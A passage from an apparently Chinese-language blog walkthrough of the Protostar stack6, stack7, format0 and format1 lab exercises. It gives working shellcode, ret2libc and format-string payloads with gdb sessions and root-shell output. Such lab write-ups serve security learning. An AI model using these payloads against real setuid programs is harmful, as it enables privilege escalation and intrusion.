</span><span style="color:#bf616a;">__libc_start_main</span><span style="color:#c0c5ce;">(0x80484fa, 1, 0xbffffd94, 0x8048520, 0x8048510 &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">input path please: </span><span style="color:#c0c5ce;">&quot; &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fstat64</span><span style="color:#c0c5ce;">(1, 0xbffff604, 0xb7fd7ff4, 0xb7fd84c0, 0x80485d0) = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 4096, 3, 34,</span><span style="color:#bf616a;"> -1</span><span style="color:#c0c5ce;">)                         = </span><span style="color:#bf616a;">0xb7fdf000</span><span style="color:#c0c5ce;">
&lt;... </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;"> resumed&gt; )                                = </span><span style="color:#bf616a;">19</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">fflush</span><span style="color:#c0c5ce;">(0xb7fd84c0 &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_write</span><span style="color:#c0c5ce;">(1, &quot;</span><span style="color:#a3be8c;">input path please: </span><span style="color:#c0c5ce;">&quot;, 19)               = </span><span style="color:#bf616a;">19</span><span style="color:#c0c5ce;">
&lt;... </span><span style="color:#bf616a;">fflush</span><span style="color:#c0c5ce;"> resumed&gt; )                                = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">gets</span><span style="color:#c0c5ce;">(0xbffffc8c, 0, 0xb7fe1b28, 1, 0 &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fstat64</span><span style="color:#c0c5ce;">(0, 0xbffffb5c, 0xb7fd7ff4, 0xb7fd8420, 0xb7fd8420) = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 4096, 3, 34,</span><span style="color:#bf616a;"> -1</span><span style="color:#c0c5ce;">)                         = </span><span style="color:#bf616a;">0xb7fde000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_read</span><span style="color:#c0c5ce;">(0, &quot;</span><span style="color:#a3be8c;">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><span style="color:#c0c5ce;">&quot;..., 4096) = </span><span style="color:#bf616a;">81</span><span style="color:#c0c5ce;">
&lt;... </span><span style="color:#bf616a;">gets</span><span style="color:#c0c5ce;"> resumed&gt; )                                  = </span><span style="color:#bf616a;">0xbffffc8c</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">got path %s\n</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><span style="color:#c0c5ce;">&quot;...) = </span><span style="color:#bf616a;">74</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">input path please: </span><span style="color:#c0c5ce;">&quot;)                         = </span><span style="color:#bf616a;">19</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">fflush</span><span style="color:#c0c5ce;">(0xb7fd84c0 &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_write</span><span style="color:#c0c5ce;">(1, &quot;</span><span style="color:#a3be8c;">got path bbbbbbbbbbbbbbbbbbbbbbb</span><span style="color:#c0c5ce;">&quot;..., 93) = </span><span style="color:#bf616a;">93</span><span style="color:#c0c5ce;">
&lt;... </span><span style="color:#bf616a;">fflush</span><span style="color:#c0c5ce;"> resumed&gt; )                                = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">gets</span><span style="color:#c0c5ce;">(0xbffffc8c, 0xbffffc8c, 0xb7fe1b28, 1, 0 &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_read</span><span style="color:#c0c5ce;">(0, &quot;&quot;, 4096)                                 = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
&lt;... </span><span style="color:#bf616a;">gets</span><span style="color:#c0c5ce;"> resumed&gt; )                                  = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">got path %s\n</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><span style="color:#c0c5ce;">&quot;...) = </span><span style="color:#bf616a;">98</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">---</span><span style="color:#c0c5ce;"> SIGSEGV (Segmentation fault) </span><span style="color:#bf616a;">---</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">+++</span><span style="color:#c0c5ce;"> killed by SIGSEGV +++</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span></code></pre><h2 id="solution-2-return-to-text">solution 2: Return to .text</h2>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> (python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#39;+(80-29)*&#39;\xcc&#39;+&#39;\xf9\x84\x04\x08&#39;+&#39;\x7c\xfc\xff\xbf&#39;</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#bf616a;">cat</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">./stack6</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;"> path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒</span><span style="color:#c0c5ce;">
                                                </span><span style="color:#bf616a;">1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">1001</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">user</span><span style="color:#c0c5ce;">) gid=1001(user) </span><span style="color:#bf616a;">euid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">) groups=0(root)</span><span style="color:#bf616a;">,1001</span><span style="color:#c0c5ce;">(user)</span><span style="color:#c0c5ce;">
</span></code></pre>
<p>后来发现这个payload是不能复用的，猜测是因为栈地址会变化的原因</p>
<h2 id="solution-3-return-to-libc">solution 3: Return to libc</h2>
<pre style="background-color:#2b303b;">
<code><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) disas main</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Dump</span><span style="color:#c0c5ce;"> of assembler code for function main:</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484fa </span><span style="color:#c0c5ce;">&lt;main+0&gt;:    push   %</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484fb </span><span style="color:#c0c5ce;">&lt;main+1&gt;:    mov    %</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">,%</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484fd </span><span style="color:#c0c5ce;">&lt;main+3&gt;:    and    $</span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">xfffffff0,%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048500 </span><span style="color:#c0c5ce;">&lt;main+6&gt;:    call   0x8048484 &lt;getpath&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048505 </span><span style="color:#c0c5ce;">&lt;main+11&gt;:   mov    %</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">,%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048507 </span><span style="color:#c0c5ce;">&lt;main+13&gt;:   pop    %</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048508 </span><span style="color:#c0c5ce;">&lt;main+14&gt;:   ret</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">End</span><span style="color:#c0c5ce;"> of assembler dump.</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) b *0x80484fd</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Breakpoint</span><span style="color:#c0c5ce;"> 1 at 0x80484fd: file stack6/stack6.c, line 26.</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) r</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Starting</span><span style="color:#c0c5ce;"> program: /opt/protostar/bin/stack6</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Breakpoint</span><span style="color:#c0c5ce;"> 1, 0x080484fd in main (argc=1, argv=0xbffffd54) </span><span style="color:#bf616a;">at</span><span style="color:#c0c5ce;"> stack6/stack6.c:26</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">26</span><span style="color:#c0c5ce;">      stack6/stack6.c: No such file or directory.</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">in</span><span style="color:#c0c5ce;"> stack6/stack6.c</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) p system</span><span style="color:#c0c5ce;">
$</span><span style="color:#bf616a;">2</span><span style="color:#c0c5ce;"> = {&lt;text variable, no debug info&gt;} 0xb7ecffb0 &lt;__libc_system&gt;</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) p exit</span><span style="color:#c0c5ce;">
$</span><span style="color:#bf616a;">3</span><span style="color:#c0c5ce;"> = {&lt;text variable, no debug info&gt;} 0xb7ec60c0 &lt;*__GI_exit&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) info proc map</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">process</span><span style="color:#c0c5ce;"> 16347</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">cmdline</span><span style="color:#c0c5ce;"> = &#39;</span><span style="color:#a3be8c;">/opt/protostar/bin/stack6</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">cwd</span><span style="color:#c0c5ce;"> = &#39;</span><span style="color:#a3be8c;">/opt/protostar/bin</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">exe</span><span style="color:#c0c5ce;"> = &#39;</span><span style="color:#a3be8c;">/opt/protostar/bin/stack6</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Mapped</span><span style="color:#c0c5ce;"> address spaces:</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">Start</span><span style="color:#c0c5ce;"> Addr   End Addr       Size     Offset objfile</span><span style="color:#c0c5ce;">
         </span><span style="color:#bf616a;">0x8048000</span><span style="color:#c0c5ce;">  0x8049000     0x1000          0       /opt/protostar/bin/stack6</span><span style="color:#c0c5ce;">
         </span><span style="color:#bf616a;">0x8049000</span><span style="color:#c0c5ce;">  0x804a000     0x1000          0       /opt/protostar/bin/stack6</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7e96000</span><span style="color:#c0c5ce;"> 0xb7e97000     0x1000          0</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7e97000</span><span style="color:#c0c5ce;"> 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7fd5000</span><span style="color:#c0c5ce;"> 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7fd6000</span><span style="color:#c0c5ce;"> 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7fd8000</span><span style="color:#c0c5ce;"> 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7fd9000</span><span style="color:#c0c5ce;"> 0xb7fdc000     0x3000          0</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7fde000</span><span style="color:#c0c5ce;"> 0xb7fe2000     0x4000          0</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7fe2000</span><span style="color:#c0c5ce;"> 0xb7fe3000     0x1000          0           </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">vdso</span><span style="color:#b48ead;">]</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7fe3000</span><span style="color:#c0c5ce;"> 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7ffe000</span><span style="color:#c0c5ce;"> 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xb7fff000</span><span style="color:#c0c5ce;"> 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">0xbffeb000</span><span style="color:#c0c5ce;"> 0xc0000000    0x15000          0           </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">stack</span><span style="color:#b48ead;">]</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) find 0xb7e9700,+2000000,&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">warning:</span><span style="color:#c0c5ce;"> Unable to access target memory at 0xb7e9700, halting search.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Pattern</span><span style="color:#c0c5ce;"> not found.</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) find 0xb7e97000,+2000000,&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0xb7fba23f</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">warning:</span><span style="color:#c0c5ce;"> Unable to access target memory at 0xb7fd9647, halting search.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">1</span><span style="color:#c0c5ce;"> pattern found.</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) x/s 0xb7fba23f</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0xb7fba23f:      </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">KIND in __gen_tempname</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span></code></pre>
<p>其中一行说到**<code>0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so</code>**，所以libc是装到了这个位置，但是我们找到/bin/sh后查看那个地方却不对</p>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> strings</span><span style="color:#bf616a;"> -a -t</span><span style="color:#c0c5ce;"> x /lib/libc-2.11.2.so | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> /bin/sh</span><span style="color:#c0c5ce;">
 </span><span style="color:#bf616a;">11f3bf</span><span style="color:#c0c5ce;"> /bin/sh</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) x/s 0xb7fb63bf</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0xb7fb63bf:      </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> (python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a&#39;*80+&#39;\xb0\xff\xec\xb7&#39;+&#39;\xc0\x60\xec\xb7&#39;+&#39;\xbf\x63\xfb\xb7&#39;</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#bf616a;">cat</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">./stack6</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;"> path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒aaaaaaaaaaaa▒▒▒▒`</span><span style="color:#bf616a;">췿c▒</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">1001</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">user</span><span style="color:#c0c5ce;">) gid=1001(user) </span><span style="color:#bf616a;">euid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">) groups=0(root)</span><span style="color:#bf616a;">,1001</span><span style="color:#c0c5ce;">(user)</span><span style="color:#c0c5ce;">
</span></code></pre><h2 id="solution-4-rop-todo">solution 4: ROP（TODO）</h2>
<h2 id="can-kao-zi-liao">参考资料</h2>
<p>总览：https://resources.infosecinstitute.com/exploiting-protostar-stack-4-7/#gref</p>
<p>总览：http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_6.html</p>
<p>ret2.text：http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_20.html</p>
<p>ret2libc：https://ohexfortyone.com/2018/03/exploit-exercises-protostar-stack-6.html</p>
<p>ret2libc：https://medium.com/@airman604/protostar-stack7-walkthrough-2aa2428be3e0</p>
<p>ROP：<a href="https://media.blackhat.com/bh-usa-08/video/bh-us-08-Shacham/black-hat-usa-08-shacham-return-oriented-programming-hires.m4v">blackhat-Return-Oriented Programming: Exploits Without Code Injection</a></p>
<p>ROP：<a href="https://speakerdeck.com/l4ys/rop-qing-song-tan">ROP轻松谈</a></p>
<h1 id="stack-7">Stack 7</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">msf </span><span style="color:#c0c5ce;">&gt; msfelfscan stack7</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">[*]</span><span style="color:#c0c5ce;"> exec: msfelfscan stack7</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Usage:</span><span style="color:#c0c5ce;"> /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/bin/msfelfscan </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">mode</span><span style="color:#b48ead;">] </span><span style="color:#c0c5ce;">&lt;options&gt; </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">targets</span><span style="color:#b48ead;">]</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Modes:</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">-j, --jump </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">regA,regB,regC</span><span style="color:#b48ead;">]</span><span style="color:#c0c5ce;">      Search for jump equivalent instructions</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">-p, --poppopret</span><span style="color:#c0c5ce;">                  Search for pop+pop+ret combinations</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">-r, --regex </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">regex</span><span style="color:#b48ead;">]</span><span style="color:#c0c5ce;">              Search for regex match</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">-a, --analyze-address </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">address</span><span style="color:#b48ead;">]</span><span style="color:#c0c5ce;">  Display the code at the specified address</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">-b, --analyze-offset </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">offset</span><span style="color:#b48ead;">]</span><span style="color:#c0c5ce;">    Display the code at the specified offset</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Options:</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">-A, --after </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">bytes</span><span style="color:#b48ead;">]</span><span style="color:#c0c5ce;">              Number of bytes to show after match (-a/-b)</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">-B, --before </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">bytes</span><span style="color:#b48ead;">]</span><span style="color:#c0c5ce;">             Number of bytes to show before match (-a/-b)</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">-D, --disasm</span><span style="color:#c0c5ce;">                     Disassemble the bytes at this address</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">-I, --image-base </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">address</span><span style="color:#b48ead;">]</span><span style="color:#c0c5ce;">       Specify an alternate ImageBase</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">-h, --help</span><span style="color:#c0c5ce;">                       Show this message</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">msf </span><span style="color:#c0c5ce;">&gt; msfelfscan</span><span style="color:#bf616a;"> --jump</span><span style="color:#c0c5ce;"> eax stack7</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">[*]</span><span style="color:#c0c5ce;"> exec: msfelfscan</span><span style="color:#bf616a;"> --jump</span><span style="color:#c0c5ce;"> eax stack7</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">[stack7]</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080484bf</span><span style="color:#c0c5ce;"> call eax</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080485eb</span><span style="color:#c0c5ce;"> call eax</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> (python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#39;+(80-29)*&#39;\xcc&#39;+&#39;\xbf\x84\x04\x08&#39;</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#bf616a;">cat</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">./stack7</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;"> path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒</span><span style="color:#c0c5ce;">
                                                </span><span style="color:#bf616a;">1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒̿▒▒▒▒▒▒▒▒▒▒▒̿▒</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">1001</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">user</span><span style="color:#c0c5ce;">) gid=1001(user) </span><span style="color:#bf616a;">euid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">) groups=0(root)</span><span style="color:#bf616a;">,1001</span><span style="color:#c0c5ce;">(user)</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="format-0">Format 0</h1>
<h2 id="solution-0-stackoverflow">solution 0: stackoverflow</h2>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a&#39;*64+&#39;\xef\xbe\xad\xde&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">xargs</span><span style="color:#c0c5ce;"> ./format0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have hit the target correctly :)</span><span style="color:#c0c5ce;">
</span></code></pre><h2 id="solution-1-format-string">solution 1: format string</h2>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;">  python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;%64d\xef\xbe\xad\xde&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">xargs</span><span style="color:#c0c5ce;"> ./format0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have hit the target correctly :)</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="format-1">Format 1</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> objdump</span><span style="color:#bf616a;"> -t</span><span style="color:#c0c5ce;"> format1 | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> target</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08049638</span><span style="color:#c0c5ce;"> g     O .bss   00000004              target</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ./format1 `</span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\x38\x96\x04\x08A&#39; +&#39;%08x.&#39;*127+&#39;%08n.&#39;+&#39;%08x.&#39;*22</span><span style="color:#c0c5ce;">&quot;`</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">8A0804960c.bffff9e8.08048469.b7fd8304.b7fd7ff4.bffff9e8.08048435.bffffbb0.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffa68.b7eadc76.00000002.bffffa94.bffffaa0.b7fe1848.bffffa50.ffffffff.b7ffeff4.0804824d.00000001.bffffa50.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffa68.e6b62d35.ccfdbb25.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffa94.08048450.08048440.b7ff1040.bffffa8c.b7fff8f8.00000002.bffffba6.bffffbb0.00000000.bffffea4.bffffec6.bffffed0.bffffee4.bffffef6.bfffff06.bfffff19.bfffff26.bfffff31.bfffff6f.bfffff86.bfffff97.bfffffa5.bfffffbc.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.0f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffb8b.0000001f.bffffff2.0000000f.bffffb9b.00000000.00000000.00000000.00000000.00000000.4f000000.e6ba1f47.9c250ca2.20d18978.691cdb81.00363836.00000000.2f2e0000.6d726f66.00317461..38302541.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.you</span><span style="color:#c0c5ce;"> have modified the target :)</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
